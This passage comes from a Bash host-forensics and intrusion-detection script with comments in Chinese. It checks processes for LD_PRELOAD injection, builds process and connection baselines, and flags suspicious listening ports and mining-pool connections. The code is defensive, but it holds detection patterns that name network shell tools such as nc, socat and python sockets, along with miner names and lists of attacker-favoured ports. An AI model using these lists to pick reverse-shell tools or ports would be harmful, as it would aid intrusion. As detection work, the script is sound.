            if [[ "$preload_lib" =~ ^/(tmp|var/tmp|dev/shm|home|root)/ ]]; then
                if [ "$preload_loaded" = true ]; then
                    ld_sev="CRITICAL"; ld_type="SECURITY_THREAT"; ld_confidence="HIGH"
                    ld_reason="进程实际加载了临时目录或用户目录中的预加载库"; ld_rule="PRS-LD-PRELOAD-UNSAFE-PATH"
                else
                    ld_sev="MEDIUM"; ld_type="SECURITY_ANOMALY"; ld_confidence="MEDIUM"
                    ld_reason="环境变量指向危险路径，但当前 maps 未确认实际加载"; ld_rule="PRS-LD-PRELOAD-UNSAFE-NOT-LOADED"
                fi
            elif [ -z "$preload_lib" ] || [ ! -e "$preload_lib" ]; then
                ld_sev="HIGH"; ld_type="SECURITY_ANOMALY"; ld_confidence="MEDIUM"
                ld_reason="预加载库路径无法解析或文件不存在"; ld_rule="PRS-LD-PRELOAD-MISSING"
            elif [[ "$preload_mode" =~ [2367][0-9]$ || "$preload_mode" =~ [0-9][2367]$ ]]; then
                if [ "$preload_loaded" = true ] && [ "$proc_euid" = "0" ]; then
                    ld_sev="HIGH"; ld_type="SECURITY_THREAT"; ld_confidence="HIGH"
                    ld_reason="特权进程实际加载了可被组或其他用户写入的预加载库"; ld_rule="PRS-LD-PRELOAD-WRITABLE-PRIVILEGED"
                else
                    ld_sev="HIGH"; ld_type="SECURITY_ANOMALY"; ld_confidence="MEDIUM"
                    ld_reason="预加载库可被非属主修改，但未确认由特权进程实际加载"; ld_rule="PRS-LD-PRELOAD-WRITABLE"
                fi
            elif [[ "$preload_lib" != /lib/* && "$preload_lib" != /lib64/* && "$preload_lib" != /usr/lib/* && "$preload_lib" != /usr/lib64/* ]]; then
                ld_sev="MEDIUM"; ld_type="SECURITY_ANOMALY"; ld_confidence="MEDIUM"
                ld_reason="预加载库不在标准系统库目录"; ld_rule="PRS-LD-PRELOAD-NONSTANDARD"
            fi
            local ld_detail="PID=${pid} PPID=${proc_ppid:-unknown}(${proc_parent}) uid=${proc_uid:-unknown} euid=${proc_euid:-unknown} comm=${pname} exe=${exe_path}; ${ld_pre}; lib=${preload_lib:-unresolved}; loaded=${preload_loaded}; owner=${preload_owner:-unknown}; mode=${preload_mode:-unknown}; package=${preload_package:-unowned}; maps=${preload_map:-none}; assessment=${ld_reason}"
            emit_find "$ld_sev" "进程设置了 LD_PRELOAD: PID ${pid} (${pname})" "$ld_detail" \
                "核实加载库的包归属、权限、哈希和启动来源；仅在出现危险路径/权限或行为关联时按注入处置"
            record_find "$ld_sev" "rootkit" "进程 LD_PRELOAD: ${preload_lib:-unresolved}" "$ld_detail" \
                "核实加载库及启动来源" "T1574.006" "$ld_rule" "${preload_lib:-$preload_value}" "proc/,module-process.log" \
                "$ld_type" "$ld_confidence" "${ld_reason}；LD_PRELOAD 本身是机制证据，不等同恶意注入" \
                "若库位于临时/用户目录、文件缺失或可写、存在异常外连/持久化，应升级处置"
            dump_suspicious_proc "$pid" "ld_preload" >/dev/null 2>&1 || true
            [ "$ld_type" != "SECURITY_THREAT" ] || add_ioc "LD_PRELOAD" "$ld_pre" "进程加载 PID ${pid} (${pname})"
        fi
    done

    # ---- 原始数据: 全量进程列表 + 可疑进程取证 ----
    # 对每个标记为可疑的进程保存 /proc 数据
    [ -n "$high_cpu" ] && {
        echo "$high_cpu" | while IFS= read -r line; do
            [ -z "$line" ] && continue
            local spid=$(echo "$line" | awk '{print $1}')
            local spname=$(echo "$line" | awk '{print $3}')
            dump_suspicious_proc "$spid" "$(echo "$spname" | tr '/' '_')"
        done
    }
    [ -n "${deleted_procs[*]}" ] && {
        for item in "${deleted_procs[@]}"; do
            local spid=$(echo "$item" | awk '{print $2}' | tr -d ':')
            dump_suspicious_proc "$spid" "deleted"
        done
    }

    collect_process_resource_baseline
    log_info "进程检查完成"
}

collect_process_resource_baseline() {
    local current="${RAW_DIR}/process-resource-current.tsv" next="${STATE_DIR}/.process-behavior.next.${RUN_ID}" old samples cpu_mean rss_mean cpu_streak rss_streak key exe hash cpu rss name new_samples new_cpu new_rss cpu_limit rss_limit
    local identity cache_key encoded old_line cpu_high rss_high
    declare -A executable_hash_cache=() old_state_by_key=()
    printf 'entity_key\tname\tpath\tsha256\tcpu_percent\trss_kb\n' > "$current"
    ps -eo pid=,comm=,pcpu=,rss= 2>/dev/null | head -2000 | while read -r pid name cpu rss; do
        [ -r "/proc/${pid}/exe" ] || continue; exe=$(readlink -f "/proc/${pid}/exe" 2>/dev/null || true); [ -n "$exe" ] || continue
        identity=$(stat -c '%d:%i:%s:%Y:%Z' -- "$exe" 2>/dev/null || true); cache_key="${exe}|${identity}"
        if [ -n "${executable_hash_cache[$cache_key]+present}" ]; then
            hash="${executable_hash_cache[$cache_key]}"
        else
            hash=$(sha256_file "$exe" 2>/dev/null || true); executable_hash_cache["$cache_key"]="$hash"
        fi
        key="path:${exe}|sha256:${hash:-unavailable}"
        printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$key" "$name" "$exe" "$hash" "${cpu:-0}" "${rss:-0}"
    done >> "$current"
    PROCESS_BEHAVIOR_OBSERVED=$(awk 'NR>1{n++}END{print n+0}' "$current")
    PROCESS_BEHAVIOR_FILE="${STATE_DIR}/process-behavior.state"; PROCESS_BEHAVIOR_PENDING="$next"
    if [ "$STATE_ENABLED" != true ]; then PROCESS_BEHAVIOR_HEALTH="DISABLED"; record_raw_status 'process-resource-current.tsv' SUCCESS process ''; return; fi
    printf '#secscope-process-behavior-v1|%s|learning_runs=3\n' "$HOST_ID" > "$next"
    if [ -s "$PROCESS_BEHAVIOR_FILE" ]; then
        while IFS= read -r old_line; do
            [[ -z "$old_line" || "$old_line" == \#* ]] && continue
            old_state_by_key["${old_line%%|*}"]="$old_line"
        done < "$PROCESS_BEHAVIOR_FILE"
    fi
    while IFS=$'\t' read -r key name exe hash cpu rss; do
        [ "$key" = entity_key ] && continue
        encoded=$(base64_one_line "$key"); old="${old_state_by_key[$encoded]:-}"
        samples=0; cpu_mean=0; rss_mean=0; cpu_streak=0; rss_streak=0
        [ -z "$old" ] || IFS='|' read -r _ samples cpu_mean rss_mean cpu_streak rss_streak _ _ <<< "$old"
        new_samples=$((samples + 1)); [ "$new_samples" -gt 50 ] && new_samples=50
        read -r new_cpu new_rss cpu_limit rss_limit cpu_high rss_high <<< "$(awk -v cm="$cpu_mean" -v rm="$rss_mean" -v n="$samples" -v cv="$cpu" -v rv="$rss" 'BEGIN{w=(n>20?20:n);nc=((cm*w)+cv)/(w+1);nr=((rm*w)+rv)/(w+1);cl=cm+(cm*1.5>30?cm*1.5:30);if(cl<80)cl=80;rl=(rm*2)+524288;if(rl<2097152)rl=2097152;printf "%.2f %.0f %.2f %.0f %d %d",nc,nr,cl,rl,(cv>cl),(rv>rl)}')"
        [ "$cpu_high" -eq 1 ] && cpu_streak=$((cpu_streak+1)) || cpu_streak=0
        [ "$rss_high" -eq 1 ] && rss_streak=$((rss_streak+1)) || rss_streak=0
        if [ "$samples" -ge 3 ] && [ "$cpu_streak" -ge 2 ]; then
            record_find MEDIUM performance "进程 CPU 持续偏离跨轮基线: $name" "entity=$key; current_cpu=$cpu; mean=$cpu_mean; threshold=$cpu_limit; streak=$cpu_streak" '关联异常路径、memfd、删除映像、矿池通信或持久化；CPU 单指标不定性木马' '' 'OBS-PROCESS-CPU-DEVIATION' "$key" 'process-resource-current.tsv,process-behavior-baseline.tsv' 'RUNTIME_OBSERVATION' MEDIUM '成熟基线后连续两轮偏离，仅作为运行异常' '若同一稳定实体出现 NETWORK/FILE/MEMORY/PERSISTENCE 独立证据域再升级' 'PROCESS'
        fi
        if [ "$samples" -ge 3 ] && [ "$rss_streak" -ge 2 ]; then
            record_find OBSERVE performance "进程内存持续偏离跨轮基线: $name" "entity=$key; current_rss_kb=$rss; mean=$rss_mean; threshold=$rss_limit; streak=$rss_streak" '大内存本身不代表木马，核对业务负载并关联其他行为证据' '' 'OBS-PROCESS-MEMORY-DEVIATION' "$key" 'process-resource-current.tsv,process-behavior-baseline.tsv' 'RUNTIME_OBSERVATION' LOW '成熟基线后的持续内存偏离仍属性能观察' '只有与明确进程、网络、内存注入或持久化证据关联时提高风险' 'PROCESS'
        fi
        [ "$new_samples" -lt 3 ] || PROCESS_BEHAVIOR_MATURE=$((PROCESS_BEHAVIOR_MATURE+1))
        printf '%s|%s|%s|%s|%s|%s|%s|%s\n' "$encoded" "$new_samples" "$new_cpu" "$new_rss" "$cpu_streak" "$rss_streak" "$(base64_one_line "$name")" "$RUN_STARTED_AT" >> "$next"
    done < "$current"
    PROCESS_BEHAVIOR_HEALTH=$([ "$PROCESS_BEHAVIOR_MATURE" -gt 0 ] && printf HEALTHY || printf LEARNING)
    cp "$next" "${RAW_DIR}/process-behavior-baseline.tsv"; chmod 600 "$current" "${RAW_DIR}/process-behavior-baseline.tsv" "$next"
    record_raw_status 'process-resource-current.tsv' SUCCESS process ''; record_raw_status 'process-behavior-baseline.tsv' SUCCESS process ''
}

commit_process_resource_baseline() {
    [ "$STATE_ENABLED" = true ] && [ -s "$PROCESS_BEHAVIOR_PENDING" ] || return 0
    [ ! -s "$PROCESS_BEHAVIOR_FILE" ] || cp "$PROCESS_BEHAVIOR_FILE" "${PROCESS_BEHAVIOR_FILE}.bak"
    mv "$PROCESS_BEHAVIOR_PENDING" "$PROCESS_BEHAVIOR_FILE"; chmod 600 "$PROCESS_BEHAVIOR_FILE" "${PROCESS_BEHAVIOR_FILE}.bak" 2>/dev/null || true
}

#==============================================================================
# 04 — 网络连接
#==============================================================================

collect_network_five_tuples() {
    local out="${RAW_DIR}/network-five-tuples.tsv" line proto state recvq sendq local_ep remote_ep proc direction local_port listeners
    listeners=$(socket_snapshot listen | awk '{print $5}' | sed -E 's/.*:([0-9]+)$/\1/' | sort -u)
    printf 'protocol\tstate\tlocal_endpoint\tremote_endpoint\tdirection\tprocess\n' > "$out"
    while IFS= read -r line; do
        [ -n "$line" ] || continue
        proto=$(printf '%s' "$line" | awk '{print $1}'); state=$(printf '%s' "$line" | awk '{print $2}')
        local_ep=$(printf '%s' "$line" | awk '{print $5}'); remote_ep=$(printf '%s' "$line" | awk '{print $6}'); proc=$(printf '%s' "$line" | cut -d' ' -f7-)
        local_port=$(endpoint_port "$local_ep"); direction=OUTBOUND
        printf '%s\n' "$listeners" | grep -qx "$local_port" && direction=INBOUND_OR_SERVER_SIDE
        [ "$state" = LISTEN ] && direction=LISTEN
        printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$proto" "$state" "$local_ep" "$remote_ep" "$direction" "$proc" >> "$out"
    done < <(socket_snapshot all | head -5000)
    record_raw_status 'network-five-tuples.tsv' SUCCESS network ''
}

add_abnormal_connection() {
    local sev="$1" pid="$2" instance="$3" exe="$4" user="$5" cmd="$6" target="$7" is_new="$8" package="$9" raw="${10}" ppid="${11}" service="${12}"
    ABNORMAL_CONN_SEVS+=("$sev"); ABNORMAL_CONN_PIDS+=("$pid"); ABNORMAL_CONN_INSTANCES+=("$instance")
    ABNORMAL_CONN_EXES+=("$exe"); ABNORMAL_CONN_USERS+=("$user"); ABNORMAL_CONN_CMDS+=("$cmd")
    ABNORMAL_CONN_TARGETS+=("$target"); ABNORMAL_CONN_NEW+=("$is_new"); ABNORMAL_CONN_PACKAGES+=("$package")
    ABNORMAL_CONN_RAW+=("$raw"); ABNORMAL_CONN_PPIDS+=("$ppid"); ABNORMAL_CONN_SERVICES+=("$service")
}

connection_baseline_seen() {
    local type="$1" key="$2"
    [ -s "$CONNECTION_BASELINE_FILE" ] && awk -F '\t' -v type="$type" -v key="$key" '$1==type && $2==key {found=1; exit} END{exit !found}' "$CONNECTION_BASELINE_FILE"
}

analyze_connection_baseline() {
    local out="${RAW_DIR}/abnormal-connections.tsv" line local_ep remote_ep remote_ip remote_port pid display instance exe user cmd ppid service package exe_hash key sev reason new_file=false
    local listen_key local_port baseline_exists=false
    ABNORMAL_CONN_SEVS=(); ABNORMAL_CONN_PIDS=(); ABNORMAL_CONN_INSTANCES=(); ABNORMAL_CONN_EXES=(); ABNORMAL_CONN_USERS=(); ABNORMAL_CONN_CMDS=()
    ABNORMAL_CONN_TARGETS=(); ABNORMAL_CONN_NEW=(); ABNORMAL_CONN_PACKAGES=(); ABNORMAL_CONN_RAW=(); ABNORMAL_CONN_PPIDS=(); ABNORMAL_CONN_SERVICES=()
    printf 'severity\tpid\tprocess_instance_id\texe\tuser\tcmdline\ttarget\tis_new\tpackage_owner\tppid\tsystemd_service\treason\traw_evidence\n' > "$out"
    [ "$STATE_ENABLED" = true ] || { CONNECTION_BASELINE_HEALTH=DISABLED; record_raw_status 'abnormal-connections.tsv' NO_RESULTS network 'state disabled'; return 0; }
    CONNECTION_BASELINE_FILE="${STATE_DIR}/connection-baseline.state"
    CONNECTION_BASELINE_PENDING="${STATE_DIR}/.connection-baseline.pending.${RUN_ID}"
    [ -s "$CONNECTION_BASELINE_FILE" ] && baseline_exists=true
    { [ -s "$CONNECTION_BASELINE_FILE" ] && cat "$CONNECTION_BASELINE_FILE"; } > "$CONNECTION_BASELINE_PENDING"
    [ -s "$CONNECTION_BASELINE_PENDING" ] || printf '#secscope-connection-baseline-v1\t%s\n' "$RUN_STARTED_AT" > "$CONNECTION_BASELINE_PENDING"

    while IFS= read -r line; do
        [ -n "$line" ] || continue
        remote_ep=$(printf '%s\n' "$line" | awk '{print $6}'); remote_ip=$(endpoint_ip "$remote_ep"); remote_port=$(endpoint_port "$remote_ep")
        is_private_or_local_ip "$remote_ip" && continue
        pid=$(printf '%s\n' "$line" | sed -nE 's/.*pid=([0-9]+).*/\1/p' | head -1); [[ "$pid" =~ ^[0-9]+$ ]] || continue
        display=$(process_display_for_pid "$pid" 2>/dev/null) || continue
        IFS=$'\t' read -r instance _ exe user cmd ppid service package <<< "$display"
        exe_hash=UNAVAILABLE; [ -f "${exe% (deleted)}" ] && exe_hash=$(sha256_file "${exe% (deleted)}" 2>/dev/null || echo UNAVAILABLE)
        key="${exe_hash}|${exe}|${user}|${remote_ip}|${remote_port}"
        awk -F '\t' -v key="$key" '$1=="CONN" && $2==key{found=1;exit} END{exit !found}' "$CONNECTION_BASELINE_PENDING" 2>/dev/null || printf 'CONN\t%s\t%s\t%s\n' "$key" "$RUN_STARTED_AT" "$RUN_STARTED_AT" >> "$CONNECTION_BASELINE_PENDING"
        [ "$baseline_exists" = true ] || continue
        connection_baseline_seen CONN "$key" && continue
        sev=LOW; reason='历史未见的进程外连组合'
        case "$user" in www-data|apache|nginx|httpd|tomcat) sev=HIGH; reason='Web 服务账号出现历史未见外连' ;; esac
        [[ "$exe" == /tmp/* || "$exe" == /var/tmp/* || "$exe" == /dev/shm/* ]] && { sev=HIGH; reason='临时目录进程出现历史未见外连'; }
        [[ "$exe" == *'(deleted)'* || "$exe" == *memfd:* ]] && { sev=HIGH; reason='deleted/memfd 进程出现历史未见外连'; }
        [ "$package" != unowned ] || { [ "$sev" = HIGH ] || sev=MEDIUM; reason="${reason}；程序无包归属"; }
        local profile_inventory="${STATE_DIR}/file_inventory.${SCAN_PROFILE}.state"
        [ -s "$profile_inventory" ] || { [ "$SCAN_PROFILE" != daily-hunt ] || profile_inventory="${STATE_DIR}/file_inventory.state"; }
        if [ -s "$profile_inventory" ] && ! awk -F '\t' -v p="${exe% (deleted)}" '$1==p{found=1;exit} END{exit !found}' "$profile_inventory"; then
            new_file=true; [ "$sev" = HIGH ] || sev=MEDIUM; reason="${reason}；执行文件不在上一轮文件基线"
        else new_file=false; fi
        add_abnormal_connection "$sev" "$pid" "$instance" "$exe" "$user" "$cmd" "${remote_ip}:${remote_port}" true "$package" "$line; reason=$reason; new_file=$new_file" "$ppid" "$service"
        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\ttrue\t%s\t%s\t%s\t%s\t%s\n' "$sev" "$pid" "$instance" "$exe" "$user" "$cmd" "${remote_ip}:${remote_port}" "$package" "$ppid" "$service" "$reason" "$(printf '%s' "$line" | tr '\t\n' '  ')" >> "$out"
        record_find "$sev" network "新增外连/异常外连候选: ${exe##*/} -> ${remote_ip}:${remote_port}" \
            "PID=${pid}; exe=${exe}; user=${user}; cmdline=${cmd}; ppid=${ppid}; systemd_service=${service}; package_owner=${package}; exe_sha256=${exe_hash}; new=true; raw=${line}; reason=${reason}" \
            '核对目标归属、程序来源、文件基线、父进程和业务变更窗口' 'T1071' 'NET-NEW-CONNECTION-COMBINATION' "$instance" \
            'abnormal-connections.tsv,process-context.tsv,ss_established.txt' 'SECURITY_ANOMALY' MEDIUM "$reason" \
            '若关联 Web/临时/deleted/memfd/无包归属程序、新增文件执行、Beacon 或持久化，应升级' 'PROCESS,NETWORK' '基于本机历史组合基线，不进行外部信誉查询'
    done < <(socket_snapshot established | head -2000)

    while IFS= read -r line; do
        [ -n "$line" ] || continue
        local_ep=$(printf '%s\n' "$line" | awk '{print $5}'); local_port=$(endpoint_port "$local_ep")
        pid=$(printf '%s\n' "$line" | sed -nE 's/.*pid=([0-9]+).*/\1/p' | head -1); [ -n "$pid" ] || pid=unknown
        if [[ "$pid" =~ ^[0-9]+$ ]] && display=$(process_display_for_pid "$pid" 2>/dev/null); then
            IFS=$'\t' read -r instance _ exe user cmd ppid service package <<< "$display"
        else instance=unknown; exe=unknown; user=unknown; cmd=unknown; ppid=unknown; service=unassociated; package=unowned; fi
        listen_key="${exe}|${user}|${local_ep}|$(printf '%s' "$line" | awk '{print $1}')"
        awk -F '\t' -v key="$listen_key" '$1=="LISTEN" && $2==key{found=1;exit} END{exit !found}' "$CONNECTION_BASELINE_PENDING" 2>/dev/null || printf 'LISTEN\t%s\t%s\t%s\n' "$listen_key" "$RUN_STARTED_AT" "$RUN_STARTED_AT" >> "$CONNECTION_BASELINE_PENDING"
        [ "$baseline_exists" = true ] || continue
        connection_baseline_seen LISTEN "$listen_key" && continue
        add_abnormal_connection MEDIUM "$pid" "$instance" "$exe" "$user" "$cmd" "LISTEN ${local_ep}" true "$package" "$line; reason=历史未见的新监听端口" "$ppid" "$service"
        printf 'MEDIUM\t%s\t%s\t%s\t%s\t%s\tLISTEN %s\ttrue\t%s\t%s\t%s\t历史未见的新监听端口\t%s\n' "$pid" "$instance" "$exe" "$user" "$cmd" "$local_ep" "$package" "$ppid" "$service" "$(printf '%s' "$line" | tr '\t\n' '  ')" >> "$out"
        record_find MEDIUM network "新增监听端口候选: ${local_ep}" \
            "PID=${pid}; exe=${exe}; user=${user}; cmdline=${cmd}; ppid=${ppid}; systemd_service=${service}; package_owner=${package}; new=true; raw=${line}" \
            '核对监听程序、服务变更记录、访问控制和业务用途' 'T1571' 'NET-NEW-LISTENER' "$instance" \
            'abnormal-connections.tsv,process-context.tsv,ss_listen.txt' 'SECURITY_ANOMALY' MEDIUM \
            '本轮监听实体和端口组合未出现在历史基线' '若关联临时/deleted/memfd/无包归属程序或入站 Shell，应升级' 'PROCESS,NETWORK'
    done < <(socket_snapshot listen | head -1000)
    CONNECTION_BASELINE_READY=true; CONNECTION_BASELINE_HEALTH=$([ "$baseline_exists" = true ] && printf OK || printf INITIALIZED)
    record_raw_status 'abnormal-connections.tsv' "$([ "${#ABNORMAL_CONN_PIDS[@]}" -gt 0 ] && printf SUCCESS || printf NO_RESULTS)" network ''
}

commit_connection_baseline() {
    [ "$CONNECTION_BASELINE_READY" = true ] || return 0
    [ -s "$CONNECTION_BASELINE_PENDING" ] || return 1
    chmod 600 "$CONNECTION_BASELINE_PENDING" && mv "$CONNECTION_BASELINE_PENDING" "$CONNECTION_BASELINE_FILE"
}

check_network() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    if [ "$NATIVE_RUNTIME_READY" = true ] && [ "$NATIVE_RUNTIME_PERIODIC_STATUS" = NOT_RUN ]; then
        if native_runtime_run periodic "${RAW_DIR}/runtime-snapshot-periodic.jsonl"; then
            native_runtime_record_status periodic "$NATIVE_RUNTIME_LAST_STATUS" network "collector_status=${NATIVE_RUNTIME_LAST_STATUS}"
            [ "$NATIVE_RUNTIME_LAST_STATUS" != PARTIAL ] || mark_current_module_partial native_runtime_periodic_partial
        else
            native_runtime_record_status periodic PARTIAL network "native_runtime_exit_or_output_invalid=${NATIVE_RUNTIME_LAST_STATUS}"
            mark_current_module_partial native_runtime_periodic_failed
        fi
    fi
    [ "$SOCKET_SNAPSHOT_STATUS" != PARTIAL ] || mark_current_module_partial native_runtime_initial_partial
    collect_network_five_tuples
    analyze_connection_baseline
    echo -e "${BOLD}${MAGENTA}  [04/12] 网络连接${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    # 监听端口
    echo -e "\n  ${BOLD}监听端口 (TCP/UDP):${NC}"
    socket_snapshot listen | head -50 | while read line; do echo "    $line"; done

    # 高危端口检测
    local danger_ports=(4444 5555 7777 8888 9999 14444 31337 1337 6666 6667 6697 8087 8088 8089 3333)
    local listen_snapshot=$(socket_snapshot listen_tcp)
    for port in "${danger_ports[@]}"; do
        is_allowed_listener_port "$port" TCP && continue
        local proc_info=$(printf '%s\n' "$listen_snapshot" | awk -v p="$port" '$5 ~ (":" p "$") {print; exit}')
        if [ -n "$proc_info" ]; then
            local port_sev="MEDIUM"
            echo "$proc_info" | grep -qiE 'nc|ncat|netcat|socat|bash|python.*socket|xmrig|miner' && port_sev="HIGH"
            emit_find "$port_sev" "敏感端口 ${port} 正在监听" \
                "$proc_info" \
                "端口号不能独立证明 C2；核实监听进程、业务用途和访问来源"
            if [ "$port_sev" = "HIGH" ]; then
                record_find "$port_sev" "network" "敏感监听端口: ${port}" "$proc_info" "核实监听进程和业务用途" "T1571" "NET-SENSITIVE-LISTENER" "listener:${port}" "ss_listen.txt" "SECURITY_ANOMALY" "MEDIUM" \
                    '端口与进程名组合具有可疑性，但监听行为本身不证明已形成控制通道' \
                    '若出现入站会话、Shell Socket 标准输入输出或异常父进程，应升级为安全威胁'
            else
                record_find "$port_sev" "network" "敏感监听端口: ${port}" "$proc_info" "核实监听进程和业务用途" "T1571" "NET-SENSITIVE-LISTENER" "listener:${port}" "ss_listen.txt" "SECURITY_ANOMALY" "LOW"
            fi
        fi
    done
    local udp_snapshot=$(socket_snapshot listen_udp) udp_info
    for port in "${danger_ports[@]}"; do
        is_allowed_listener_port "$port" UDP && continue
        udp_info=$(printf '%s\n' "$udp_snapshot" | awk -v p="$port" '$5 ~ (":" p "$") {print; exit}')
        [ -n "$udp_info" ] || continue
        emit_find "LOW" "敏感 UDP 端口 ${port} 已绑定" "$udp_info" "核实进程、服务与业务用途；UDP 绑定不代表已经建立外部会话"
        record_find "LOW" network "敏感 UDP 端口: ${port}" "$udp_info" "核实绑定进程和业务用途" "" \
            "NET-SENSITIVE-UDP" "udp-listener:${port}" "ss_listen.txt" "SECURITY_ANOMALY" "LOW"
    done

    # 对外 ESTABLISHED 连接
    echo -e "\n  ${BOLD}活跃外部连接 (ESTABLISHED):${NC}"
    socket_snapshot established | grep -v '127.0.0.1\|::1\|0.0.0.0' | head -30 | while read line; do echo "    $line"; done

    # 异常外部连接：只检查服务器主动发起的公网非标准端口连接。若本地端口是监听端口，
    # 则属于入站会话，不再误判为服务器主动外联。同一 PID 到同一远端 IP 按事件组聚合。
    local conn_line local_endpoint peer_endpoint local_port peer_port peer_ip pid pname exe cmdline service key listen_pid
    declare -A listener_index=() external_ports=() external_counts=() external_raw=()
    while IFS= read -r conn_line; do
        local_endpoint=$(printf '%s\n' "$conn_line" | awk '{print $5}'); local_port=$(endpoint_port "$local_endpoint")
        listen_pid=$(printf '%s\n' "$conn_line" | sed -nE 's/.*pid=([0-9]+).*/\1/p' | head -1)
        [[ "$listen_pid" =~ ^[0-9]+$ && "$local_port" =~ ^[0-9]+$ ]] && listener_index["${listen_pid}|${local_port}"]=1
    done < <(socket_snapshot listen_tcp)
    while IFS= read -r conn_line; do
        local_endpoint=$(printf '%s\n' "$conn_line" | awk '{print $5}')
        peer_endpoint=$(printf '%s\n' "$conn_line" | awk '{print $6}')
        local_port=$(endpoint_port "$local_endpoint"); peer_port=$(endpoint_port "$peer_endpoint"); peer_ip=$(endpoint_ip "$peer_endpoint")
        [[ "$local_port" =~ ^[0-9]+$ && "$peer_port" =~ ^[0-9]+$ ]] || continue
        pid=$(printf '%s\n' "$conn_line" | sed -nE 's/.*pid=([0-9]+).*/\1/p' | head -1)
        [[ "$pid" =~ ^[0-9]+$ ]] && [ -n "${listener_index[${pid}|${local_port}]:-}" ] && continue
        is_private_or_local_ip "$peer_ip" && continue
        is_trusted_remote_ip "$peer_ip" && continue
        is_common_port "$peer_port" && continue
        printf '%s\n' "$conn_line" | grep -qiE 'lychee-agent|monitorpub|ospubcollector|datadog|zabbix|node_exporter|filebeat|fluentd|barad_agent|hostguard|hostwatch|umtr|opsagent|sshd|rsync' && continue
        [ -n "$pid" ] || pid="unknown"
        key="${pid}|${peer_ip}"
        external_counts[$key]=$(( ${external_counts[$key]:-0} + 1 ))
        case ",${external_ports[$key]:-}," in *",${peer_port},"*) ;; *) external_ports[$key]="${external_ports[$key]:-}${external_ports[$key]:+,}${peer_port}" ;; esac
        external_raw[$key]="${external_raw[$key]:-}${external_raw[$key]:+$'\n'}${conn_line}"
    done < <(socket_snapshot established | head -500)
    for key in "${!external_counts[@]}"; do
        pid="${key%%|*}"; peer_ip="${key#*|}"; pname="未知"; exe="未知"; cmdline="未知"; service="未关联"
        if [[ "$pid" =~ ^[0-9]+$ ]]; then
            pname=$(cat "/proc/${pid}/comm" 2>/dev/null || echo '未知')
            exe=$(readlink -f "/proc/${pid}/exe" 2>/dev/null || echo '未知')
            cmdline=$(tr '\0' ' ' < "/proc/${pid}/cmdline" 2>/dev/null | head -c 500); [ -n "$cmdline" ] || cmdline='未知'
            service=$(sed -nE 's#.*[/]([^/]+[.]service)(/.*)?$#\1#p' "/proc/${pid}/cgroup" 2>/dev/null | head -1); [ -n "$service" ] || service='未关联'
        fi
        local enriched="PID=${pid}; 程序=${pname}; 路径=${exe}; 远端IP=${peer_ip}; 远端端口=${external_ports[$key]}; 连接数=${external_counts[$key]}; 服务=${service}; 命令行=${cmdline}"
        enriched+=$'\n'"${external_raw[$key]}"
        emit_find "LOW" "公网非标准端口连接: ${pname} → ${peer_ip}" "$enriched" "检查目的地址、ASN、进程、服务和业务用途"
        record_find "LOW" "network" "公网非标准端口连接: ${pname} → ${peer_ip}" "$enriched" "审查连接目标、进程和关联服务" "T1571" \
            "NET-PUBLIC-NONSTANDARD" "external:${pid}:${peer_ip}" "ss_established.txt,network_external_enriched.txt" "SECURITY_ANOMALY" "LOW" \
            '仅确认公网非标准端口连接，未发现恶意归属或危险行为；公有编号地址也可能是企业路由或合法服务' \
            '若进程路径异常、命令行可疑、目的地址命中情报或与持久化/敏感文件变化关联，应升级研判'
    done
    {
        for key in "${!external_counts[@]}"; do
            printf 'PID=%s RemoteIP=%s Ports=%s Count=%s\n%s\n\n' "${key%%|*}" "${key#*|}" "${external_ports[$key]}" "${external_counts[$key]}" "${external_raw[$key]}"
        done
    } | dump_raw 'network_external_enriched.txt'

    # 检查到矿池端口的连接
    local pool_ports=(14444 3333 4444 5555 7777 8088 8888 9999)
    for port in "${pool_ports[@]}"; do
        # 只匹配对端端口，避免本地临时端口碰巧等于矿池常用端口。
        local pool_conn=$(socket_snapshot established | awk -v p="$port" '$6 ~ (":" p "$")')
        if [ -n "$pool_conn" ]; then
            local pool_sev="MEDIUM"
            echo "$pool_conn" | grep -qiE 'xmrig|minergate|cpuminer|minerd|stratum' && pool_sev="CRITICAL"
            emit_find "$pool_sev" "检测到矿池常用端口的对外连接: ${port}" \
                "$pool_conn" \
                "端口本身不是入侵结论；结合进程、域名和 stratum 协议进一步确认"
            if [ "$pool_sev" = "CRITICAL" ]; then
                record_find "$pool_sev" "miner" "矿池进程与常用端口关联: ${port}" "$pool_conn" "结合进程和协议确认" "T1496" \
                    "MIN-PROCESS-NETWORK" "miner-process-network:${port}" "ss_established.txt,ps_auxww.txt" "SECURITY_THREAT" "HIGH"
            else
                record_find "$pool_sev" "network" "矿池常用端口连接: ${port}" "$pool_conn" "结合进程和协议确认" "T1496" \
                    "NET-MINING-PORT" "mining-port:${port}" "ss_established.txt" "SECURITY_ANOMALY" "LOW" \
                    '只命中常见端口，端口可被正常服务使用，也可被攻击者任意更换' \
                    '若关联高 CPU、无包归属进程、stratum 特征或持久化，应升级为挖矿威胁'
            fi
        fi
    done

    # iptables 当前规则
    echo -e "\n  ${BOLD}iptables 规则 (前20条):${NC}"
    iptables -L -n -v 2>/dev/null | head -20 | while read line; do echo "    $line"; done

    # 检查防火墙清空（异常情况）
    if command -v iptables >/dev/null 2>&1; then
        local ipt_snapshot
        if ! ipt_snapshot=$(iptables -S 2>/dev/null); then
            mark_current_module_partial "iptables_read_failed"
        elif ! printf '%s\n' "$ipt_snapshot" | grep -qE '^-A[[:space:]]+'; then
            # 没有历史基线时，空规则集只是配置状态，不能推断为攻击者清空。
            log_warn "iptables 未发现追加规则；请结合 firewalld/nftables 和历史基线确认"
        fi
    fi

    # ARP 表
    echo -e "\n  ${BOLD}ARP 表:${NC}"
    arp -a 2>/dev/null | head -10 | while read line; do echo "    $line"; done

    # 网卡混杂模式
    local promisc=$(ip link show 2>/dev/null | grep -i PROMISC)
    if [ -n "$promisc" ]; then
        emit_find "MEDIUM" "网卡处于混杂模式" \
            "$promisc" \
            "除非是 IDS/抓包机器，否则可能是嗅探攻击"
        record_find "MEDIUM" "network" "网卡混杂模式" "$promisc" "排查是否需要" "" \
